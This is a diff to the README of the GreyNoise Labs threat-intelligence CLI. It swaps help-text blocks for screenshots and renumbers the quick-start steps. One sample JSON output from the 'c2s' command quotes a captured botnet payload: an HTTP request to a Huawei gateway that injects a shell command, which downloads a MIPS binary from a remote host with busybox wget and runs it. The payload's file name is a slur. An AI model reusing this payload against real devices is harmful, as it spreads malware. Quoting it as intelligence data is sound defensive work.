@@ -37,47 +37,12 @@ CLI Install
 CLI Quick Start
 ===============
 1. To show usage just run ``greynoiselabs`` and you should see this output.
-..  code-block:: bash
 
-    Usage: greynoiselabs [OPTIONS] COMMAND [ARGS]...
-
-    ╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-    │ --install-completion          Install completion for the current shell.                                                      │
-    │ --show-completion             Show completion for the current shell, to copy it or customize the installation.               │
-    │ --help                        Show this message and exit.                                                                    │
-    ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-    ╭─ Commands ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-    │ c2s          Return the top 1% of C2s ranked by pervasiveness. This data may be up to 4.5 hours old but covers the previous  │
-    │              24 hours.                                                                                                       │
-    │ gengnql      Translate text into usable GreyNoise GNQL queries.                                                              │
-    │ init         Initialize the client by authenticating with Auth0 and saving the token to a file.                              │
-    │ knocks       Return the top 1% of Knock results by most recently seen. A Knock represents an IP observed by GreyNoise that   │
-    │              we have scanned back. This data may be up to 12 hours old. This endpoint supports filtering by a single IP.     │
-    │ noise-rank   Return the top 1% of ranked IPs by noise score over the previous 7 days of traffic. This also returns the       │
-    │              pervasiveness and diversity scores. This endpoint supports filtering by a single IP.                            │
-    │ popular-ips  Return the top 1% of IPs searched in GreyNoise. These results are ordered by the number of users observed over  │
-    │              the last 7 days. This data may be up to 24 hours old. This also returns the user and request counts. This also  │
-    │              returns a boolean if this IP was observed by GreyNoise sensors.                                                 │
-    │ version      Return the version of the GreyNoise Labs CLI.                                                                   │
-    ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+.. image:: https://github-production-user-asset-6210df.s3.amazonaws.com/30487781/256922968-bbed72e3-c973-4398-86d8-c4383ffa0283.png
 
 1. Run ``greynoiselabs knocks --help`` to show command specific help like below.
-..  code-block:: bash
 
-    Usage: greynoiselabs knocks [OPTIONS] [IP]                                                                             
-                                                                                                                            
-    Return the top 1% of Knock results by most recently seen. A Knock represents an IP observed by GreyNoise that we have  
-    scanned back. This data may be up to 12 hours old. This endpoint supports filtering by a single IP.                    
-                                                                                                                            
-    ╭─ Arguments ──────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-    │   ip      [IP]  Specify the IP to retrieve.                                                                          │
-    ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-    ╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-    │ --output  -o      TEXT  JSON lines output file location.                                                             │
-    │ --config  -c      TEXT  Output directory for CLI config.                                                             │
-    │                         [default: /Users/matt/Library/Application Support/greynoiselabs/0.1.19]                      │
-    │ --help                  Show this message and exit.                                                                  │
-    ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+.. image:: https://github-production-user-asset-6210df.s3.amazonaws.com/30487781/256923019-432213b0-6a10-4283-bc8e-2365368c977a.png
 
 1. Run ``greynoiselabs c2s | jq``
 
@@ -94,7 +59,7 @@ CLI Quick Start
       "payload": "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 5.6.7.8 -l /tmp/negro -r /.oKA31/bok.mips; /bin/busybox chmod 777 /tmp/negro; /tmp/negro hw.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
     }
 
-1. Run ``greynoiselabs knocks | jq``
+4. Run ``greynoiselabs knocks | jq``
 
 ..  code-block:: json
 
@@ -118,7 +83,7 @@ CLI Quick Start
       "tor_exit": false
     }
 
-1. Run ``greynoiselabs popular-ips | jq``
+5. Run ``greynoiselabs popular-ips | jq``
 
 ..  code-block:: json
 
@@ -131,7 +96,7 @@ CLI Quick Start
       "last_seen": "2023-07-27T23:59:11Z"
     }
 
-1. Run ``greynoiselabs noise-rank | jq``
+6. Run ``greynoiselabs noise-rank | jq``
 
 ..  code-block:: json
 
@@ -145,7 +110,7 @@ CLI Quick Start
       "sensor_pervasiveness": "very high"
     }
 
-1. Run ``greynoiselabs gengnql "Show malicious results that are targeting ukraine from russia"``
+7. Run ``greynoiselabs gengnql "Show malicious results that are targeting ukraine from russia"``
 Results will differ for `gengnql` on subsequent runs as this is using an GPT prompt.
 
 ..  code-block:: bash
